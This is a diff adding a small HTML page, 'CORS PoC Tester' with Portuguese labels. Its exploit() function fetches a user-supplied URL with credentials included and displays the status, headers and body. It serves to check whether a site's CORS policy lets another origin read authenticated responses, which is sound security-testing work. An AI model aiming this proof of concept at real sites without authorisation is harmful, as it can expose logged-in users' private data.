@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC Tester</title>
+</head>
+
+<body>
+  <h2>CORS PoC - Leitura Cross-Origin</h2>
+
+  <label>URL alvo:</label><br>
+  <input 
+    id="target" 
+    type="text" 
+    placeholder="https://exemplo.com/api"
+    style="width:400px"
+  >
+
+  <br><br>
+
+  <button onclick="exploit()">Executar PoC</button>
+
+  <pre id="result" style="white-space: pre-wrap; margin-top:20px;"></pre>
+
+
+<script>
+
+function exploit() {
+
+    const url = document.getElementById("target").value;
+
+    if (!url) {
+        document.getElementById("result").innerText =
+        "Informe uma URL alvo.";
+        return;
+    }
+
+
+    fetch(url, {
+        method: "GET",
+        credentials: "include"
+    })
+
+    .then(response => {
+
+        document.getElementById("result").innerText =
+        "Status HTTP: " + response.status + "\n\n" +
+        "Headers:\n" +
+        [...response.headers.entries()]
+          .map(([k,v]) => `${k}: ${v}`)
+          .join("\n") +
+        "\n\nResposta:\n";
+
+        return response.text();
+
+    })
+
+    .then(data => {
+
+        document.getElementById("result").innerText += data;
+
+    })
+
+    .catch(error => {
+
+        document.getElementById("result").innerText =
+        "Erro ao executar a PoC:\n" + error;
+
+    });
+
+}
+
+</script>
+
+</body>
+</html>
